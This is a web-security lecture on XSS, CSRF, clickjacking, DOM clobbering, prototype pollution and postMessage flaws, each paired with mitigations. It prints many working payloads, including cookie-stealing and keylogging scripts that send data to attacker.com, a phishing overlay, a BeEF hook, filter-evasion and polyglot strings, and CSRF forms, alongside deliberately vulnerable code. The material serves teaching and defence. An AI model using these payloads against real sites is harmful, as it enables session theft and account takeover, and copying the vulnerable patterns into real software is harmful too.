# Client-Side Vulnerabilities

Client-side vulnerabilities exploit weaknesses in how web browsers and client-side code handle user input and external data. Unlike server-side vulnerabilities that execute on the server, client-side attacks execute in the victim's browser, potentially compromising the user's session, data, and interactions with the web application. This lecture covers the most critical client-side vulnerabilities and their mitigations.

## Cross-Site Scripting (XSS)

Cross-Site Scripting (XSS) is one of the most prevalent and dangerous web vulnerabilities. XSS occurs when an attacker injects malicious scripts into web pages viewed by other users. These scripts execute in the victim's browser with the same privileges as the legitimate application code.

### Why XSS is Dangerous

**Impact of XSS:**

1. **Session Hijacking**: Steal session cookies and impersonate users
2. **Credential Theft**: Capture keystrokes, form inputs, passwords
3. **Phishing**: Display fake login forms or modify page content
4. **Malware Distribution**: Redirect to malicious sites or download malware
5. **Defacement**: Modify website appearance
6. **Data Exfiltration**: Access and steal sensitive information
7. **Account Takeover**: Change passwords, email addresses
8. **Propagation**: Create self-replicating XSS worms (stored XSS)
9. **Cryptocurrency Mining**: Use victim's CPU for mining
10. **Complete Application Control**: Execute any action the user can perform

### Types of XSS

XSS vulnerabilities are classified into three main types based on how the payload is delivered and executed.

The three types differ in *where the payload lives* before it runs:

```text
  REFLECTED                               payload lives in the URL
    attacker --link--> victim browser --GET ?q=<payload>--> server
                            <-- response echoes the payload ---'
                            script runs for whoever clicked

  STORED                                  payload lives in the DB
    attacker --POST comment=<payload>--> server --> database
    victim   --GET /comments ----------> server --> database
                            <-- page contains the payload -----'
                            script runs for every visitor

  DOM-BASED                      payload never reaches the server
    attacker --link #<payload>--> victim browser
                                  page JS reads location.hash
                                  writes it into innerHTML
                                  script runs
```

This is why server-side input filtering stops reflected and stored XSS
but is useless against DOM-based XSS: the payload stays in the fragment,
which the browser never sends.

## 1. Reflected XSS (Non-Persistent)

**Definition**: The malicious script is embedded in the HTTP request (typically URL or form data) and immediately reflected back in the response without proper sanitization.

**Characteristics:**

- Requires user interaction (clicking malicious link)
- Payload not stored on server
- Single request/response cycle
- Also called Type-I or Non-Persistent XSS

### Reflected XSS Example

**Vulnerable Application:**

```php
<?php
// search.php
$query = $_GET['q'];
echo "<h1>Search results for: " . $query . "</h1>";
?>
```

**Normal Request:**

```url
https://example.com/search?q=security
Response: <h1>Search results for: security</h1>
```

**Malicious Request:**

```url
https://example.com/search?q=<script>alert(document.cookie)</script>
Response: <h1>Search results for: <script>alert(document.cookie)</script></h1>
```

**Attack Scenario:**

1. Attacker crafts malicious URL:

   ```url
   https://example.com/search?q=<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>
   ```

2. Attacker sends URL to victim via:
   - Email phishing
   - Social media
   - Malicious website
   - SMS/messaging apps

3. Victim clicks link
4. Script executes in victim's browser
5. Cookie sent to attacker's server

**URL Encoding to Evade Detection:**

```url
https://example.com/search?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

### Advanced Reflected XSS Payloads

**Basic Alert:**

```javascript
<script>alert(document.domain)</script>
```

**Cookie Exfiltration:**

```javascript
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
```

**Image Tag (No Script Tags):**

```html
<img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)">
```

**SVG Payload:**

```html
<svg onload="alert(1)">
```

**Iframe Injection:**

```html
<iframe src="javascript:alert(document.cookie)">
```

## 2. Stored XSS (Persistent)

**Definition**: The malicious script is permanently stored on the server (database, file, logs, etc.) and executed whenever users access the affected page.

**Characteristics:**

- Stored in application's database/storage
- Executes automatically when page loads
- No direct user interaction required
- Most dangerous type of XSS
- Also called Type-II or Persistent XSS
- Can create XSS worms

### Stored XSS Example

**Vulnerable Comment System:**

```php
<?php
// Save comment
$comment = $_POST['comment'];
$db->query("INSERT INTO comments (text) VALUES ('$comment')");

// Display comments
$comments = $db->query("SELECT text FROM comments");
foreach ($comments as $comment) {
    echo "<div class='comment'>" . $comment['text'] . "</div>";
}
?>
```

**Attack Scenario:**

1. **Attacker submits comment:**

   ```html
   <script>
   // Steal cookies from all visitors
   fetch('https://attacker.com/collect', {
     method: 'POST',
     body: JSON.stringify({
       cookie: document.cookie,
       url: window.location.href,
       user: document.querySelector('.username')?.innerText
     })
   });
   </script>
   ```

2. Comment stored in database
3. Every user viewing comments page executes the script
4. Attacker collects data from all victims

### Stored XSS Attack Vectors

**User Profiles:**

```html
Username: <img src=x onerror="alert(1)">
Bio: <svg onload="alert(document.domain)">
Website: javascript:alert(1)
```

**Forum Posts:**

```html
[b]Bold text[/b] <script>/* Malicious code */</script>
```

**File Uploads (SVG):**

```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full"
     xmlns="http://www.w3.org/2000/svg">
  <polygon id="triangle" points="0,0 0,50 50,0" fill="#009900"
           stroke="#004400"/>
  <script type="text/javascript">
    alert(document.domain);
  </script>
</svg>
```

**Contact Forms:**

```html
Name: <img src=x onerror=alert(1)>
Message: Click <a href="javascript:void(fetch('//attacker.com/steal?c='+document.cookie))">here</a>
```

### Self-Replicating XSS Worm

**Samy Worm (MySpace 2005) - Concept:**

```javascript
<script>
// Payload that adds attacker as friend and posts itself
var ajax = new XMLHttpRequest();
ajax.open('POST', '/addFriend', true);
ajax.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
ajax.send('friend=attacker');

// Copy payload to victim's profile
var payload = document.getElementById('payload').innerHTML;
var profile = new XMLHttpRequest();
profile.open('POST', '/updateProfile', true);
profile.send('bio=' + encodeURIComponent(payload));
</script>
```

## 3. DOM-Based XSS

**Definition**: The vulnerability exists in client-side JavaScript code that improperly handles user input, modifying the DOM without proper sanitization.

**Characteristics:**

- Payload never sent to server
- Executed entirely in browser
- Server-side filters ineffective
- Harder to detect with traditional tools
- Sources: URL fragments, postMessage, localStorage

### DOM XSS Sources (Input Points)

**URL-Based Sources:**

- `location.href`
- `location.hash` (#fragment)
- `location.search` (?query)
- `document.URL`
- `document.documentURI`
- `document.referrer`

**Other Sources:**

- `window.name`
- `postMessage` data
- `localStorage` / `sessionStorage`
- `IndexedDB`
- `WebSocket` messages

### DOM XSS Sinks (Dangerous Functions)

**Code Execution:**

- `eval()`
- `Function()`
- `setTimeout()` with string argument
- `setInterval()` with string argument

**HTML Modification:**

- `element.innerHTML`
- `element.outerHTML`
- `document.write()`
- `document.writeln()`

**Attribute Modification:**

- `element.src`
- `element.href`
- `element.action`
- `element.formaction`
- `element.srcdoc`

**jQuery Sinks:**

- `$()`
- `.html()`
- `.append()`
- `.after()`

### DOM XSS Examples

#### Example 1: innerHTML

```javascript
// Vulnerable code
var search = document.getElementById('search').value;
var results = document.getElementById('results');
results.innerHTML = 'You searched for: ' + search;
```

**Attack:** the user (or a pre-filled link) puts this in the search field:

```html
<img src=x onerror=alert(1)>
```

The `<img>` fails to load, `onerror` fires, and the payload executes.

#### Example 2: location.hash

```javascript
// Vulnerable code
var name = location.hash.substring(1);
document.write('Welcome ' + name);
```

**Attack:**

```url
https://example.com/page#<img src=x onerror=alert(1)>
```

#### Example 3: jQuery

```javascript
// Vulnerable code
var input = location.hash.substring(1);
$('#content').html('Results: ' + input);
```

**Attack:**

```url
https://example.com/#<script>alert(1)</script>
```

#### Example 4: Attribute Sink

```javascript
// Vulnerable code
var url = location.hash.substring(1);
document.getElementById('link').href = url;
```

**Attack:**

```url
https://example.com/#javascript:alert(document.cookie)
```

### Advanced DOM XSS

**Template Literals:**

```javascript
// Vulnerable
const name = location.hash.substring(1);
document.body.innerHTML = `<h1>Hello ${name}</h1>`;
```

**Prototype Pollution Leading to DOM XSS:**

Pollution alone is not XSS. It becomes XSS when polluted property lookup
feeds a sink, because a missing own property falls back to the prototype:

```javascript
// Attacker-controlled pollution (e.g. via a vulnerable merge or a
// query string parsed into an object):
Object.prototype.template = '<img src=x onerror=alert(1)>';

// Later, library code reads an option that was never set:
const config = {};
element.innerHTML = config.template;  // resolves via the prototype
```

## Mutation XSS (mXSS)

**Definition**: XSS that exploits browser's HTML parser inconsistencies and mutation behavior, bypassing sanitization.

**How It Works:**

1. Input passes sanitization
2. Browser's parser mutates the HTML
3. Mutation creates valid XSS payload

**Example:**

```html
<!-- Input (passes sanitizer) -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>">

<!-- After browser parsing (mXSS) -->
<noscript><p title=""></noscript><img src=x onerror=alert(1)>
```

**Another Example:**

```html
<!-- Input -->
<form><math><mtext></form><form><mglyph><style><!--</style><img src=x onerror=alert(1)>

<!-- Browser mutation creates XSS -->
```

**Mitigation:**

- Use DOMPurify with safe parsing mode
- Avoid innerHTML, use textContent
- Implement strict CSP

## XSS Filter Bypasses

### 1. Bypassing WAF/Filters

**Case Manipulation:**

```html
<ScRiPt>alert(1)</sCrIpT>
<IMG SRC=x ONERROR=alert(1)>
```

**HTML Encoding:**

```html
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
```

**JavaScript Encoding:**

```html
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">
```

**Hex Encoding:**

```html
<img src=x onerror="eval('\x61\x6c\x65\x72\x74\x28\x31\x29')">
```

**Unicode Escapes:**

```html
<img src=x onerror="\u{61}\u{6c}\u{65}\u{72}\u{74}(1)">
```

### 2. Bypassing Sanitization

**Incomplete Tag Removal:**

If filter removes `<script>`:

```html
<scr<script>ipt>alert(1)</script>
<!-- After removal: <script>alert(1)</script> -->
```

**Event Handler Obfuscation:**

```html
<img src=x one
rror=alert(1)>  <!-- Newline breaks detection -->

<img src=x onerror
=alert(1)>

<img/src=x/onerror=alert(1)>
```

**Alternative Tags:**

```html
<svg/onload=alert(1)>
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<iframe onload=alert(1)>
<video><source onerror=alert(1)>
<audio src=x onerror=alert(1)>
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
```

**Alternative Event Handlers:**

```html
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<img src=x onmouseover=alert(1)>
<img src=x onclick=alert(1)>
<img src=x onanimationstart=alert(1)>
<img src=x onanimationend=alert(1)>
```

### 3. Context-Specific Bypasses

**Inside Attribute:**

```html
" onload="alert(1)
' onload='alert(1)
`onload=`alert(1)
```

**Breaking Out of JavaScript String:**

```javascript
var search = 'USER_INPUT';

// Attack: '; alert(1); //
var search = ''; alert(1); //';
```

**Breaking Out of JavaScript Comment:**

```javascript
var search = 'USER_INPUT'; // Display results

// Attack:
// </script><script>alert(1)//
```

### 4. Polyglot Payloads

Work in multiple contexts:

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

Simpler polyglot:

```html
'"><img src=x onerror=alert(1)>
```

## XSS Exploitation Techniques

### 1. Cookie Theft

```javascript
<script>
fetch('https://attacker.com/steal?c=' + document.cookie);
</script>
```

**With Image:**

```javascript
<script>
new Image().src = 'https://attacker.com/steal?c=' + document.cookie;
</script>
```

### 2. Keylogger

```javascript
<script>
document.onkeypress = function(e) {
  fetch('https://attacker.com/keys', {
    method: 'POST',
    body: e.key
  });
};
</script>
```

### 3. Phishing

```javascript
<script>
document.body.innerHTML = `
  <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:white;z-index:9999;">
    <h1>Session Expired</h1>
    <form action="https://attacker.com/phish" method="POST">
      Username: <input name="user"><br>
      Password: <input type="password" name="pass"><br>
      <button>Login</button>
    </form>
  </div>
`;
</script>
```

### 4. BeEF Hook

Browser Exploitation Framework:

```html
<script src="https://attacker.com/beef/hook.js"></script>
```

Attacker gains:

- Browser information
- Plugin detection
- Network scanning
- Social engineering modules
- Persistent access

### 5. Cryptocurrency Mining

XSS can also load a miner that burns the victim's CPU while the page is
open. The best-known service, Coinhive, shut down in 2019, but the
pattern is unchanged: inject a script tag, let it run in the background.

```javascript
<script src="https://attacker.com/miner.js"></script>
```

## XSS Prevention and Mitigation

### 1. Input Validation

**Whitelist Approach:**

```javascript
// Only allow alphanumeric
function validateInput(input) {
  return /^[a-zA-Z0-9]+$/.test(input);
}
```

**Sanitize HTML:**

```javascript
// Use DOMPurify
const clean = DOMPurify.sanitize(dirty);
```

### 2. Output Encoding

**HTML Context:**

```javascript
function encodeHTML(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;')
    .replace(/\//g, '&#x2F;');
}
```

**JavaScript Context:**

```javascript
function encodeJS(str) {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t');
}
```

**URL Context:**

```javascript
const encoded = encodeURIComponent(userInput);
```

### 3. Use Safe APIs

**Safe:**

```javascript
element.textContent = userInput;  // Safe
element.setAttribute('data-value', userInput);  // Safe (for data attributes)
```

**Unsafe:**

```javascript
element.innerHTML = userInput;  // Dangerous!
element.outerHTML = userInput;  // Dangerous!
```

### 4. Content Security Policy (CSP)

```http
Content-Security-Policy:
  default-src 'self';
  script-src 'nonce-{random}' 'strict-dynamic';
  object-src 'none';
```

### 5. HTTPOnly Cookies

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

### 6. Template Engines with Auto-Escaping

**React (Auto-escapes):**

```jsx
<div>{userInput}</div>  // Automatically escaped
```

**Vue.js:**

```vue
<div>{{ userInput }}</div>  // Automatically escaped
```

**Angular:**

```html
<div>{{ userInput }}</div>  // Automatically escaped
```

### 7. Framework-Specific Protection

**React - Dangerous innerHTML:**

```jsx
// Avoid this:
<div dangerouslySetInnerHTML={{__html: userInput}} />

// Use this instead:
<div>{userInput}</div>
```

**Vue.js - v-html:**

```vue
<!-- Avoid -->
<div v-html="userInput"></div>

<!-- Use -->
<div>{{ userInput }}</div>
```

## Cross-Site Request Forgery (CSRF)

**Definition**: CSRF tricks authenticated users into executing unwanted actions on a web application where they're authenticated. The attack abuses the browser's automatic inclusion of authentication credentials (cookies) with cross-origin requests.

### How CSRF Works

**Prerequisites for CSRF:**

1. **Relevant Action**: Privileged action or state-changing operation
2. **Cookie-Based Authentication**: Application relies solely on cookies
3. **No Unpredictable Parameters**: Attacker can determine all request parameters

**Attack Flow:**

1. Victim authenticates to `vulnerable-bank.com`
2. Browser stores session cookie
3. Victim visits attacker's site `evil.com`
4. Attacker's page makes request to `vulnerable-bank.com`
5. Browser automatically includes session cookie
6. Request executes with victim's privileges

```text
   victim                     evil.com                bank.com
      |                           |                       |
      | 1. log in ----------------+----------------------->
      |<-- Set-Cookie: session ---+-----------------------|
      |                           |                       |
      | 2. visit ----------------->                       |
      |<-- page with an auto-submitting form              |
      |                           |                       |
      | 3. POST /transfer --------+----------------------->
      |  the browser attaches bank.com's cookie           |
      |  automatically: cookies are keyed by the          |
      |  destination, not by the page that sent           |
      |  the request
      |                           |                       |
      |<-- 200 OK, money moved ---+-----------------------|
```

Note that the attacker never reads the response. Same-origin policy
blocks that. CSRF only needs the *side effect* of the request, which is
why read-only endpoints are not CSRF targets.

### CSRF Attack Examples

#### Example 1: GET Request

**Vulnerable Endpoint:**

```url
GET /transfer?to=attacker&amount=1000
```

**Attack:**

```html
<!-- On attacker's website -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">
```

When victim loads attacker's page, image tag triggers request with victim's cookies.

#### Example 2: POST Request (Auto-Submit Form)

**Vulnerable Endpoint:**

```url
POST /transfer
to=recipient&amount=1000
```

**Attack:**

```html
<html>
<body>
  <form id="csrf" action="https://bank.com/transfer" method="POST">
    <input name="to" value="attacker">
    <input name="amount" value="1000">
  </form>
  <script>
    document.getElementById('csrf').submit();
  </script>
</body>
</html>
```

#### Example 3: XMLHttpRequest

```html
<script>
fetch('https://bank.com/transfer', {
  method: 'POST',
  credentials: 'include',  // Include cookies
  headers: {
    'Content-Type': 'application/x-www-form-urlencoded'
  },
  body: 'to=attacker&amount=1000'
});
</script>
```

#### Example 4: Change Email (Account Takeover)

```html
<form action="https://example.com/change-email" method="POST">
  <input name="email" value="attacker@evil.com">
</form>
<script>
  document.forms[0].submit();
</script>
```

After email changed, attacker requests password reset.

### CSRF Defense Mechanisms

#### 1. CSRF Tokens (Synchronizer Token Pattern)

**Server-Side:**

```php
// Generate token
$token = bin2hex(random_bytes(32));
$_SESSION['csrf_token'] = $token;

// Verify token
if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die('CSRF token validation failed');
}
```

**Client-Side:**

```html
<form method="POST" action="/transfer">
  <input type="hidden" name="csrf_token" value="<?= $csrf_token ?>">
  <input name="to">
  <input name="amount">
  <button>Transfer</button>
</form>
```

**AJAX Requests:**

```javascript
fetch('/transfer', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
    'X-CSRF-Token': getTokenFromMeta()
  },
  body: JSON.stringify({to: 'recipient', amount: 1000})
});
```

#### 2. SameSite Cookies

```http
Set-Cookie: session=abc123; SameSite=Strict; Secure; HttpOnly
```

**SameSite Values:**

- **Strict**: Never sent on cross-site requests

  ```http
  Set-Cookie: session=abc123; SameSite=Strict
  ```

  ✅ Blocks cross-site requests, including top-level navigation
  ❌ Breaks legitimate inbound links (user arrives logged out)
  ⚠️ "Same-site" means the registrable domain, so a request from
  `evil.example.com` to `example.com` still counts as same-site

- **Lax** (Default in modern browsers):

  ```http
  Set-Cookie: session=abc123; SameSite=Lax
  ```

  ✅ Sent on top-level GET navigation (clicking links)
  ❌ Not sent on POST, iframe, AJAX
  ✅ Good balance between security and usability

- **None**:

  ```http
  Set-Cookie: session=abc123; SameSite=None; Secure
  ```

  ✅ Sent on all requests (requires Secure flag)
  ❌ No CSRF protection

#### 3. Custom Headers

```javascript
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Custom-Header': 'value'
  },
  body: JSON.stringify(data)
});
```

**Server validates:**

```python
if request.headers.get('X-Requested-With') != 'XMLHttpRequest':
    abort(403)
```

**Why This Works:**
Simple requests can be sent cross-origin, but custom headers trigger CORS preflight, which attacker cannot pass without CORS headers.

#### 4. Double-Submit Cookie Pattern

```javascript
// Set token in cookie and form
document.cookie = 'csrf_token=' + token;

<form>
  <input type="hidden" name="csrf_token" value="TOKEN">
</form>
```

**Server validates:**

```python
if request.cookies['csrf_token'] != request.form['csrf_token']:
    abort(403)
```

This pattern requires no server-side state, which is why it is popular,
but it is the weakest of the token defenses: anyone who can set a cookie
on the parent domain (a vulnerable or taken-over subdomain) can choose
both halves of the comparison. See "Subdomain Takeover" below. Prefer
the synchronizer token pattern, or sign the cookie value.

#### 5. Referer/Origin Validation

```python
allowed_origins = ['https://example.com', 'https://app.example.com']
origin = request.headers.get('Origin') or request.headers.get('Referer')

if not any(origin.startswith(allowed) for allowed in allowed_origins):
    abort(403)
```

**Limitations:**

- Users can disable Referer header
- Can be bypassed with open redirects
- Not recommended as sole defense

### CSRF Bypass Techniques

#### 1. Bypass SameSite=Lax

GET requests are allowed with SameSite=Lax:

```html
<a href="https://bank.com/transfer?to=attacker&amount=1000">
  Click for prize!
</a>
```

**Mitigation**: Use POST for state-changing operations.

#### 2. Token Leakage

If token appears in URL or Referer:

```html
<a href="https://bank.com/transfer?csrf_token=abc123&to=victim">
<!-- If this leaks in Referer to attacker's site -->
```

#### 3. Token in Response

If token predictable or reusable:

```javascript
// Fetch token first
fetch('https://bank.com/get-token')
  .then(r => r.text())
  .then(token => {
    // Use stolen token
    fetch('https://bank.com/transfer', {
      method: 'POST',
      body: 'csrf_token=' + token + '&to=attacker'
    });
  });
```

**Mitigation**: Ensure CORS headers prevent cross-origin token reading.

#### 4. Subdomain Takeover

If attacker controls subdomain:

```javascript
// On evil.example.com (same-site!)
document.cookie = 'csrf_token=attacker_value; domain=.example.com';
```

**Mitigation**: Don't use domain-wide cookies for CSRF tokens.

## Clickjacking

**Definition**: Clickjacking tricks users into clicking on something different from what they perceive, potentially causing them to perform unintended actions.

### How Clickjacking Works

Attacker overlays an invisible iframe over deceptive content. The trick
is purely about stacking order and alignment:

```text
  what the user sees            where the click actually lands

  +------------------------+    z-index 2 . invisible iframe
  |                        |    ################################
  |   [ FREE iPHONE! ]     |    #  bank.com/delete-account     #
  |                        |    #     [ Confirm delete ]       #
  +------------------------+    ################################
  z-index 1 . attacker page     opacity 0.0001, stacked on top
                                and aligned over the fake button
```

The iframe is the topmost layer, so it receives the click; the user only
ever sees the layer underneath it.

```html
<html>
<head>
  <style>
    iframe {
      position: absolute;
      top: 100px;
      left: 200px;
      width: 500px;
      height: 300px;
      opacity: 0.0001;  /* Nearly invisible */
      z-index: 2;
    }
    button {
      position: absolute;
      top: 200px;
      left: 350px;
      z-index: 1;
    }
  </style>
</head>
<body>
  <iframe src="https://bank.com/delete-account"></iframe>
  <button>Click for FREE iPHONE!</button>
</body>
</html>
```

User thinks they're clicking "Click for FREE iPHONE!" but actually clicking "Delete Account" button in invisible iframe.

### Clickjacking Attack Scenarios

**1. Like/Follow Jacking:**

```html
<iframe src="https://facebook.com/page/like"></iframe>
<div>Click to continue...</div>
```

**2. Credential Theft:**

```html
<!-- Overlay fake login over real login iframe -->
<iframe src="https://site.com/login"></iframe>
```

**3. Webcam/Microphone Permission:**

```html
<iframe src="https://site.com/request-permissions"></iframe>
```

**4. Drag-and-Drop:**

```html
<iframe src="data:text/html,<script>/* malicious */</script>"></iframe>
<!-- Trick user into dragging content into browser address bar -->
```

### Clickjacking Defenses

**1. X-Frame-Options Header:**

```http
X-Frame-Options: DENY
```

Cannot be embedded in any frame.

```http
X-Frame-Options: SAMEORIGIN
```

Can only be framed by same origin.

**2. CSP frame-ancestors:**

```http
Content-Security-Policy: frame-ancestors 'none'
```

Modern replacement for X-Frame-Options.

```http
Content-Security-Policy: frame-ancestors 'self'
```

Only same origin can frame.

```http
Content-Security-Policy: frame-ancestors https://trusted.com
```

Specific origin can frame.

**3. Frame-Busting JavaScript (Unreliable):**

```javascript
// Don't rely on this alone!
if (top !== self) {
  top.location = self.location;
}
```

**Bypass:**

```html
<iframe sandbox="allow-forms allow-scripts" src="..."></iframe>
```

## Other Client-Side Vulnerabilities

### DOM Clobbering

**Definition**: Exploiting browser's behavior of creating global variables for HTML elements with `id` or `name` attributes.

**Example:**

The attacker injects plain HTML, no JavaScript required. This is why DOM
clobbering survives a CSP that blocks inline script:

```html
<!-- Injected markup. Two elements sharing an id make window.config an
     HTMLCollection, so config.apiUrl resolves to the named anchor. -->
<a id="config"></a>
<a id="config" name="apiUrl" href="https://attacker.com/evil.js"></a>
```

```javascript
// Application code that assumed `config` was its own object.
// `window.config` was never declared, so the clobbered element wins.
let script = document.createElement('script');
script.src = config.apiUrl;  // -> https://attacker.com/evil.js
document.body.appendChild(script);
```

Anchors are the useful element here: `HTMLAnchorElement` stringifies to
its `href`, so the clobbered property behaves like a string. Most other
elements stringify to something like `[object HTMLInputElement]`, which
is why clobbering payloads are built from `<a>` tags.

**Mitigation:**

- Use `const`/`let` for variables
- Don't rely on global scope
- Validate types: `if (typeof config === 'object')`

### Prototype Pollution

**Definition**: Modifying JavaScript object prototypes, affecting all objects.

**Example:**

```javascript
// Vulnerable merge function
function merge(target, source) {
  for (let key in source) {
    target[key] = source[key];
  }
  return target;
}

// Attack payload
let payload = JSON.parse('{"__proto__": {"admin": true}}');
merge({}, payload);

// Now all objects have admin property
let user = {};
console.log(user.admin);  // true!
```

**Client-Side Impact:**

- XSS via polluted properties
- Authentication bypass
- Security control bypass

**Mitigation:**

```javascript
function safeMerge(target, source) {
  for (let key in source) {
    if (key === '__proto__' || key === 'constructor' || key === 'prototype') {
      continue;
    }
    if (source.hasOwnProperty(key)) {
      target[key] = source[key];
    }
  }
}
```

### WebSocket Vulnerabilities

**Missing Origin Validation:**

```javascript
// Vulnerable server
wss.on('connection', function(ws) {
  // No origin check!
  ws.on('message', function(msg) {
    processMessage(msg);
  });
});
```

**Attack:**

```html
<!-- Attacker's page -->
<script>
let ws = new WebSocket('wss://vulnerable.com/socket');
ws.onopen = function() {
  ws.send('{"action": "deleteAccount"}');
};
</script>
```

**Mitigation:**

```javascript
wss.on('connection', function(ws, req) {
  const origin = req.headers.origin;
  if (origin !== 'https://trusted.com') {
    ws.close();
    return;
  }
  // ...
});
```

### postMessage Vulnerabilities

**Insecure Receiver:**

```javascript
// Vulnerable
window.addEventListener('message', function(e) {
  // No origin check!
  eval(e.data);
});
```

**Attack:**

```javascript
targetWindow.postMessage('alert(document.cookie)', '*');
```

**Secure Implementation:**

```javascript
window.addEventListener('message', function(e) {
  // Validate origin
  if (e.origin !== 'https://trusted.com') {
    return;
  }

  // Validate data
  if (typeof e.data !== 'string') {
    return;
  }

  // Safe processing
  processMessage(e.data);
});
```

## Key Takeaways

- XSS remains one of the most critical web vulnerabilities
- Three main types: Reflected, Stored, and DOM-based
- Always encode output based on context
- Use CSP and HTTPOnly cookies as defense-in-depth
- CSRF requires both prevention mechanisms and secure coding
- SameSite cookies provide strong CSRF protection
- Clickjacking needs frame-ancestors CSP or X-Frame-Options
- Modern JavaScript introduces new attack vectors (Prototype Pollution, DOM Clobbering)
- WebSockets and postMessage require explicit origin validation
- Defense requires multiple layers of protection

## Resources

### XSS

- OWASP XSS Guide: <https://owasp.org/www-community/attacks/xss/>
- PortSwigger XSS: <https://portswigger.net/web-security/cross-site-scripting>
- XSS Filter Evasion: <https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html>
- DOMPurify: <https://github.com/cure53/DOMPurify>
- Google XSS Game: <https://xss-game.appspot.com/>

### CSRF

- OWASP CSRF: <https://owasp.org/www-community/attacks/csrf>
- PortSwigger CSRF: <https://portswigger.net/web-security/csrf>
- SameSite Cookies: <https://web.dev/samesite-cookies-explained/>

### Clickjacking

- OWASP Clickjacking: <https://owasp.org/www-community/attacks/Clickjacking>
- PortSwigger Clickjacking: <https://portswigger.net/web-security/clickjacking>

### Advanced Topics

- Prototype Pollution: <https://portswigger.net/web-security/prototype-pollution>
- DOM Clobbering: <https://portswigger.net/web-security/dom-based/dom-clobbering>
- PostMessage Security: <https://portswigger.net/research/stealing-user-info-with-postmessage>

### Tools

- **Burp Suite**: XSS and CSRF testing
- **OWASP ZAP**: Automated scanning
- **XSStrike**: Advanced XSS detection
- **CSP Evaluator**: <https://csp-evaluator.withgoogle.com/>
- **BeEF**: Browser Exploitation Framework
